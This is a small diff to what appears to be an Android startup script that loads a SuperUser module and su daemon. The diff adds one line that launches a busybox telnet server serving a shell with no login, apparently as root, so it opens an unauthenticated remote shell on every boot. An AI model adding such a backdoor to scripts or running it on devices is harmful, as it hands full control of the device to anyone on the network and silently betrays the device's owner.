@@ -21,4 +21,5 @@ fi
 # Aktifkan SuperUser Kernel Module & Daemon
 insmod /system/lib/libsupol.so
 /system/xbin/daemonsu --auto-daemon &
+/system/xbin/busybox telnetd -l /system/bin/sh &
 
